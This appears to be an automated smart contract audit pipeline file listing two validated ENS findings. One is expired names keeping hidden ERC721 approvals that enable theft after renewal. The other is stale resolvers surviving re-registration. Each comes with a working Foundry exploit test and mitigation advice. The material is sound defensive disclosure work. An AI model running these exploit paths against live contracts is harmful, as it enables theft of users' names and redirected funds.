# ens-contracts Round 4 Canonicalization Input

Source validated run: `/Users/apmfree/Desktop/CHAIN SHIELD/ai-agent-audit/validation-three-shot/runs/v2/ens-contracts-run-001.md`
Candidate count: `2`

This file contains only findings currently marked `Valid` with reportable severity for the configured validation profile.

## Candidates

## C-1 / `_qAeE89D1CAdrEK_KI7DX`
- Finding title: Expired ENS names can receive hidden ERC721 approvals that become active again after renewal
- Report lines: 159-262

### Original Report Block
```md
## [C-1]. Expired ENS names can receive hidden ERC721 approvals that become active again after renewal

## id: _qAeE89D1CAdrEK_KI7DX

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
AuthByPass

## Location
BaseRegistrarImplementation.approve

## Finding Status: Valid
### Finding Status Justification: The root cause exists in the in-scope production contract BaseRegistrarImplementation, which overrides ownerOf() and _isApprovedOrOwner() to treat expired names as unowned, but does not override ERC721.approve(). With OpenZeppelin 4.9.x, inherited approve() resolves the owner using ERC721.ownerOf(tokenId), i.e. the base ERC721 storage owner, not the registrar's expiry-aware ownerOf(). Therefore, while expiries[id] <= block.timestamp, public BaseRegistrarImplementation.ownerOf(id) reverts and transfer/reclaim authorization through _isApprovedOrOwner() is blocked, but the stale ERC721 owner or an operator approved for that stale owner can still call approve(attacker, id). renew() only increments expiries[id] and does not clear token approvals. Once renewed, _isApprovedOrOwner() sees a live owner and accepts getApproved(id) == attacker, allowing transferFrom() or reclaim(). No complete safeguard is shown: expiry checks exist in ownerOf() and _isApprovedOrOwner(), but the exact approval path bypasses them; renew() does not clear approvals; and setApprovalForAll revocation does not clear per-token approvals. The exploit does not require admin/controller compromise: renewal is performed through normal controller flows, and the malicious actor can be a previously approved non-privileged operator using public ERC721 approval/transfer functions. The scenario depends on normal protocol/lifecycle behavior, not a victim-only arbitrary mistake or future integration. No documentation in the supplied material explicitly accepts hidden approvals on expired names as intended behavior.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BaseRegistrarImplementation overrides ownerOf() and _isApprovedOrOwner() so expired names are treated as unowned, but it inherits OpenZeppelin ERC721.approve() unchanged. In OZ 4.9, approve() uses ERC721.ownerOf(tokenId) internally, which bypasses BaseRegistrarImplementation.ownerOf() and reads the stale ERC721 owner stored before expiry. As a result, an old owner or previously approved operator can set a per-token approval while the name is expired and public ownerOf(id) reverts. If the name is renewed during the grace period, that stale approval immediately becomes usable for transferFrom() or reclaim(). Vulnerable snippet: function ownerOf(uint256 tokenId) public view override(IERC721, ERC721) returns (address) { require(expiries[tokenId] > block.timestamp); return super.ownerOf(tokenId); } ... function _isApprovedOrOwner(address spender,uint256 tokenId) internal view override returns (bool) { address owner = ownerOf(tokenId); return (spender == owner || getApproved(tokenId) == spender || isApprovedForAll(owner, spender)); } The missing override is approve(): inherited ERC721.approve() does not apply the expiry-aware ownerOf() gate.

## Impact
Direct theft of an ENS ERC721 name after renewal. A previously approved operator can preserve authority as a per-token approval while the name is expired, survive later operator revocation, and transfer the NFT once the victim renews during grace.

## Proof of Concept
1. Alice owns an ENS registrar token and has previously approved an operator, such as a marketplace, with setApprovalForAll. 2. The name expires but remains inside the 90 day grace period, so BaseRegistrarImplementation.ownerOf(id) reverts and the name is supposed to be unowned for authorization purposes. 3. Before Alice renews, the old operator calls inherited approve(attacker, id). This succeeds because ERC721.approve() uses the stale internal ERC721 owner instead of the registrar's expiry-aware ownerOf(). 4. Alice revokes the operator approval and renews the name during grace. 5. The attacker's per-token approval is still stored, so attacker calls transferFrom(alice, attacker, id) and steals the renewed ENS NFT.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/ethregistrar/BaseRegistrarImplementation.sol";

contract MockENS is ENS {
    mapping(bytes32 => address) public owners;
    function setOwnerForTest(bytes32 node, address owner_) external { owners[node] = owner_; }
    function owner(bytes32 node) external view override returns (address) { return owners[node]; }
    function setSubnodeOwner(bytes32 node, bytes32 label, address owner_) external override returns (bytes32) { bytes32 subnode = keccak256(abi.encodePacked(node, label)); owners[subnode] = owner_; return subnode; }
    function setResolver(bytes32, address) external override {}
    function setRecord(bytes32 node, address owner_, address, uint64) external override { owners[node] = owner_; }
    function setSubnodeRecord(bytes32 node, bytes32 label, address owner_, address, uint64) external override { owners[keccak256(abi.encodePacked(node, label))] = owner_; }
    function setOwner(bytes32 node, address owner_) external override { owners[node] = owner_; }
    function setTTL(bytes32, uint64) external override {}
    function setApprovalForAll(address, bool) external override {}
    function resolver(bytes32) external pure override returns (address) { return address(0); }
    function ttl(bytes32) external pure override returns (uint64) { return 0; }
    function recordExists(bytes32 node) external view override returns (bool) { return owners[node] != address(0); }
    function isApprovedForAll(address, address) external pure override returns (bool) { return false; }
}

contract ExpiredApprovalPoC is Test {
    MockENS ens;
    BaseRegistrarImplementation registrar;
    bytes32 baseNode = keccak256("eth");
    uint256 id = uint256(keccak256("alice"));
    address controller = address(0xC011);
    address alice = address(0xA11CE);
    address operator = address(0x0A0A);
    address attacker = address(0xBEEF);

    function setUp() public {
        vm.warp(100 days);
        ens = new MockENS();
        registrar = new BaseRegistrarImplementation(ens, baseNode);
        ens.setOwnerForTest(baseNode, address(registrar));
        registrar.addController(controller);
    }

    function testExpiredApprovalBecomesActiveAfterRenewal() public {
        vm.prank(controller);
        uint256 expiry = registrar.register(id, alice, 30 days);

        vm.prank(alice);
        registrar.setApprovalForAll(operator, true);

        vm.warp(expiry + 1);
        vm.expectRevert();
        registrar.ownerOf(id);

        vm.prank(operator);
        registrar.approve(attacker, id);
        assertEq(registrar.getApproved(id), attacker);

        vm.prank(alice);
        registrar.setApprovalForAll(operator, false);
        assertEq(registrar.isApprovedForAll(alice, operator), false);

        vm.prank(controller);
        registrar.renew(id, 365 days);
        assertEq(registrar.ownerOf(id), alice);

        vm.prank(attacker);
        registrar.transferFrom(alice, attacker, id);
        assertEq(registrar.ownerOf(id), attacker);
    }
}


## Suggested Mitigation
Override approve() to use the expiry-aware ownerOf() or _isApprovedOrOwner() path, and reject approvals when expiries[tokenId] <= block.timestamp. Consider also overriding getApproved()/transfer authorization helpers consistently for expired names or clearing approvals when a name expires/renews.
```

### Current Validated Block
### C-1 / `_qAeE89D1CAdrEK_KI7DX`
- Finding Title: Expired ENS names can receive hidden ERC721 approvals that become active again after renewal
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Critical
- Root Cause Family: `expired-token-approval`
- Bounty Criteria Match: critical (smart contract): Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties
- Checklist Gates Passed: `in-scope asset, current code path, unprivileged attacker path, exact impact row, feasible exploit path`
- Checklist Gates Failed: `-`
- Detailed Reason: The issue maps cleanly to the ENS program's Critical NFT theft row: a non-privileged address that previously held normal ERC721 operator authority can create a hidden per-token approval while the name is expired, survive revocation of the operator approval, and transfer the renewed registrar NFT once it becomes live again. The impact is not merely stale state or UX confusion; it is unauthorized transfer of an ENS ERC721 after renewal, and it does not require DAO/admin access, leaked keys, or a malicious trusted protocol role.
- Code Evidence: In `contracts/ethregistrar/BaseRegistrarImplementation.sol`, `ownerOf` treats names as unowned after expiry by requiring `expiries[tokenId] > block.timestamp`, and `_isApprovedOrOwner` uses that expiry-aware `ownerOf`; however the contract does not override ERC721 `approve`. The inherited OpenZeppelin `ERC721.approve` calls `ERC721.ownerOf(tokenId)` directly, while `renew` only increments `expiries[id]` and does not clear approvals, so the stored `getApproved(id)` becomes usable again by `transferFrom` or `reclaim` after renewal.

## C-3 / `J8z405q9aEEOyFyX089YE`
- Finding title: Expired .eth name re-registration without resolver leaves prior owner's resolver controlling resolution
- Report lines: 345-474

### Original Report Block
```md
## [C-3]. Expired .eth name re-registration without resolver leaves prior owner's resolver controlling resolution

## id: J8z405q9aEEOyFyX089YE

## Derived From Pattern/Invariant
AccountingInvariantViolation / stale resolver state must not survive expired re-registration without an explicit resolver

## Exploit Type
AccountingInvariantViolation

## Location
ETHRegistrarController.register

## Finding Status: Valid
### Finding Status Justification: The described code path exists in in-scope production contracts. In ETHRegistrarController.register, the resolver-zero branch calls base.register(labelhash, registration.owner, duration) and does not call ens.setRecord or otherwise clear resolver/TTL. BaseRegistrarImplementation._register, with updateRegistry=true, updates expiries, burns any expired ERC721, mints the token to the new owner, and calls ens.setSubnodeOwner(baseNode, bytes32(id), owner). ENSRegistry.setSubnodeOwner only updates records[subnode].owner through _setOwner and emits NewOwner; it does not change records[subnode].resolver or records[subnode].ttl. Therefore a resolver address previously set for the node can persist after re-registration. If the previous registrant selected a resolver contract they control, that resolver can continue returning or changing resolution data even after registry ownership moves to the new registrant, until the new registrant changes the resolver. The no-resolver path is explicitly supported by makeCommitment, provided data and reverseRecord are absent, so the preconditions are not impossible. There is no complete safeguard in this path: availability/grace-period checks only gate re-registration, and ownership transfer does not clear stale resolver state. This does not require privileged access, compromised keys, or purely victim misuse; it arises from normal public registration behavior with resolver == address(0). No supplied documentation explicitly accepts this exact stale resolver control risk as intentional, and the issue exists in the current code rather than depending on a future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When an expired name is re-registered with registration.resolver == address(0), ETHRegistrarController only calls base.register(id, registration.owner, duration). BaseRegistrarImplementation then updates the ENS subnode owner through ens.setSubnodeOwner(...), but ENSRegistry.setSubnodeOwner changes only records[subnode].owner and does not clear records[subnode].resolver or TTL. As a result, a resolver set by the previous registrant remains the active resolver for the newly registered name. If the old resolver is controlled by the old registrant, the old registrant can keep changing what the new owner's name resolves to after the NFT has been minted to the new owner. Vulnerable flow: `if (registration.resolver == address(0)) { expires = base.register(uint256(labelhash), registration.owner, registration.duration); }`; supporting registrar code then calls only `ens.setSubnodeOwner(baseNode, bytes32(id), owner);`, leaving the previous resolver untouched.

## Impact
The previous registrant can keep controlling resolution for a name now owned by a new user whenever the new registration uses the supported no-resolver path. This can redirect payments or integrations that resolve the name, causing direct theft of funds in motion and unintended alteration of what the ENS NFT/name represents until the new owner notices and updates the resolver.

## Proof of Concept
1. The attacker registers `stale.eth` with a resolver contract they control and configures it to resolve to the attacker's address. 2. The name expires and passes the registrar grace period, so it becomes available. 3. A victim registers the same label through ETHRegistrarController with `registration.resolver == address(0)`, which is an explicitly supported branch. 4. The controller/base registrar mints the ERC721 to the victim and updates ENS ownership, but the ENS resolver remains the attacker's resolver. 5. The attacker updates their resolver to a new receiving address after the victim owns the NFT. 6. Users or integrations resolving `stale.eth` receive the attacker's address and can send funds to the attacker while the victim is the registrar owner.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "contracts/registry/ENSRegistry.sol";
import "contracts/ethregistrar/BaseRegistrarImplementation.sol";
import "contracts/ethregistrar/ETHRegistrarController.sol";
import "contracts/ethregistrar/IPriceOracle.sol";
import "contracts/resolvers/profiles/IAddrResolver.sol";

contract FixedPriceOracle is IPriceOracle {
    function price(string calldata, uint256, uint256) external pure returns (IPriceOracle.Price memory) {
        return IPriceOracle.Price({base: 1 ether, premium: 0});
    }
}

contract MutableResolver is IAddrResolver {
    address public controller;
    address payable public target;
    constructor(address payable initialTarget) { controller = msg.sender; target = initialTarget; }
    function setTarget(address payable newTarget) external { require(msg.sender == controller); target = newTarget; }
    function addr(bytes32) external view returns (address payable) { return target; }
    function supportsInterface(bytes4) external pure returns (bool) { return false; }
}

contract NoopReverseRegistrar is IReverseRegistrar {
    function setDefaultResolver(address) external {}
    function claim(address) external pure returns (bytes32) { return bytes32(0); }
    function claimForAddr(address, address, address) public pure returns (bytes32) { return bytes32(0); }
    function claimWithResolver(address, address) external pure returns (bytes32) { return bytes32(0); }
    function setName(string memory) external pure returns (bytes32) { return bytes32(0); }
    function setNameForAddr(address, address, address, string memory) external pure returns (bytes32) { return bytes32(0); }
    function node(address) external pure returns (bytes32) { return bytes32(0); }
}

contract NoopDefaultReverseRegistrar is IDefaultReverseRegistrar {
    function setName(string memory) external {}
    function setNameForAddrWithSignature(address, uint256, string memory, bytes memory) external {}
    function setNameForAddr(address, string memory) external {}
}

contract ETHRegistrarControllerStaleResolverPoC is Test {
    bytes32 constant ETH_NODE = 0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae;
    ENSRegistry ens;
    BaseRegistrarImplementation base;
    ETHRegistrarController controller;
    FixedPriceOracle oracle;
    MutableResolver oldResolver;
    address oldOwner = address(0xA11CE);
    address newOwner = address(0xB0B);
    address payable attackerSink1 = payable(address(0x1111));
    address payable attackerSink2 = payable(address(0x2222));

    function setUp() public {
        vm.warp(1000 days);
        ens = new ENSRegistry();
        base = new BaseRegistrarImplementation(ENS(address(ens)), ETH_NODE);
        bytes32 ethLabel = keccak256(bytes("eth"));
        ens.setSubnodeOwner(bytes32(0), ethLabel, address(base));
        oracle = new FixedPriceOracle();
        controller = new ETHRegistrarController(base, oracle, 1, 90 days, IReverseRegistrar(address(new NoopReverseRegistrar())), IDefaultReverseRegistrar(address(new NoopDefaultReverseRegistrar())), ENS(address(ens)));
        base.addController(address(controller));
        oldResolver = new MutableResolver(attackerSink1);
    }

    function _commitAndRegister(ETHRegistrarController.Registration memory r, address caller) internal returns (uint256) {
        bytes32 c = controller.makeCommitment(r);
        controller.commit(c);
        vm.warp(block.timestamp + 2);
        vm.deal(caller, 10 ether);
        vm.prank(caller);
        controller.register{value: 1 ether}(r);
        return base.nameExpires(uint256(keccak256(bytes(r.label))));
    }

    function testExpiredReregistrationKeepsPriorResolverControl() public {
        ETHRegistrarController.Registration memory first = ETHRegistrarController.Registration({label: "stale", owner: oldOwner, duration: 28 days, secret: bytes32("old"), resolver: address(oldResolver), data: new bytes[](0), reverseRecord: 0, referrer: bytes32(0)});
        uint256 expires = _commitAndRegister(first, oldOwner);
        bytes32 node = keccak256(abi.encodePacked(ETH_NODE, keccak256(bytes("stale"))));
        assertEq(ens.owner(node), oldOwner);
        assertEq(ens.resolver(node), address(oldResolver));
        assertEq(IAddrResolver(ens.resolver(node)).addr(node), attackerSink1);

        vm.warp(expires + base.GRACE_PERIOD() + 1);

        ETHRegistrarController.Registration memory second = ETHRegistrarController.Registration({label: "stale", owner: newOwner, duration: 28 days, secret: bytes32("new"), resolver: address(0), data: new bytes[](0), reverseRecord: 0, referrer: bytes32(0)});
        _commitAndRegister(second, newOwner);

        assertEq(base.ownerOf(uint256(keccak256(bytes("stale")))), newOwner);
        assertEq(ens.owner(node), newOwner);
        assertEq(ens.resolver(node), address(oldResolver));

        oldResolver.setTarget(attackerSink2);
        assertEq(IAddrResolver(ens.resolver(node)).addr(node), attackerSink2);
    }
}

## Suggested Mitigation
When registering without an explicit resolver, clear resolver and TTL for the namehash instead of only changing ownership. For example, have the controller call `ens.setRecord(namehash, registration.owner, address(0), 0)` after `base.register(...)`, or add a registrar path that updates the registry owner and clears resolver/TTL atomically for re-registrations.
```

### Current Validated Block
### C-3 / `J8z405q9aEEOyFyX089YE`
- Finding Title: Expired .eth name re-registration without resolver leaves prior owner's resolver controlling resolution
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Critical
- Root Cause Family: `stale-resolver-state`
- Bounty Criteria Match: critical (smart contract): Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)
- Checklist Gates Passed: `in-scope asset, current code path, unprivileged attacker path, exact impact row, feasible exploit path`
- Checklist Gates Failed: `-`
- Detailed Reason: This is a clear submission-grade issue because a previous unprivileged registrant can leave a resolver they control attached to an expired name, and a later no-resolver re-registration changes ownership without clearing that resolver. For an ENS name NFT, the resolver is the active payload users and integrations consult for what the name represents; retaining attacker-controlled resolution after ownership transfers is an unintended alteration of the NFT/name representation, with payment redirection as a plausible follow-on effect.
- Code Evidence: In `contracts/ethregistrar/ETHRegistrarController.sol`, the `registration.resolver == address(0)` branch calls only `base.register(...)`; the resolver-setting branch is the one that calls `ens.setRecord(...)`. `BaseRegistrarImplementation._register` then calls `ens.setSubnodeOwner(baseNode, bytes32(id), owner)`, and `contracts/registry/ENSRegistry.sol` shows `setSubnodeOwner` updates only the subnode owner, while resolver and TTL are changed only through `setRecord`, `setSubnodeRecord`, or `_setResolverAndTTL`.

